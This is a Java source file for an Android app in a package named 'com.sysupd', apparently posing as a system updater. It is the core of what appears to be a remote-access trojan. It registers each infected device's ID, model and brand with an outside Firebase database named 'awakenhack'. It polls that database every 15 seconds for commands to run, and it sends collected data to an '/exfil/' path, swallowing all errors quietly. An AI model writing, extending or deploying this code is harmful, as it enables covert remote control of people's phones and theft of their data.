package com.sysupd;

import android.content.Context;
import android.provider.Settings;
import java.io.*;
import java.net.*;

public class Core {
    public static String BASE = "https://awakenhack-default-rtdb.firebaseio.com";
    public static String DEV = "";
    public static Context CTX = null;

    public static void init(Context ctx) {
        CTX = ctx;
        DEV = Settings.Secure.getString(ctx.getContentResolver(), "android_id");
        register();
        new Thread(new Runnable() {
            public void run() {
                while (true) {
                    try {
                        String url = BASE + "/devices/" + DEV +
                            "/commands.json?orderBy=\"delivered\"&equalTo=false";
                        String resp = http(url, "GET", null);
                        if (resp != null && !resp.equals("null") && resp.length() > 2) {
                            Cmd.handle(resp);
                        }
                        Thread.sleep(15000);
                    } catch (Exception e) {}
                }
            }
        }).start();
    }

    static void register() {
        String url = BASE + "/devices/" + DEV + ".json";
        String body = "{\"model\":\"" + android.os.Build.MODEL +
            "\",\"brand\":\"" + android.os.Build.BRAND +
            "\",\"online\":true,\"ts\":" + System.currentTimeMillis() + "}";
        http(url, "PUT", body);
    }

    public static String http(String urlStr, String method, String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
            c.setRequestMethod(method);
            c.setRequestProperty("Content-Type", "application/json");
            if (body != null) {
                c.setDoOutput(true);
                c.getOutputStream().write(body.getBytes());
                c.getOutputStream().close();
            }
            BufferedReader r = new BufferedReader(
                new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    public static void send(String type, String data) {
        String url = BASE + "/exfil/" + DEV + "/" +
            System.currentTimeMillis() + ".json";
        String body = "{\"type\":\"" + type + "\",\"data\":" + data +
            ",\"ts\":" + System.currentTimeMillis() + "}";
        http(url, "PUT", body);
    }
}
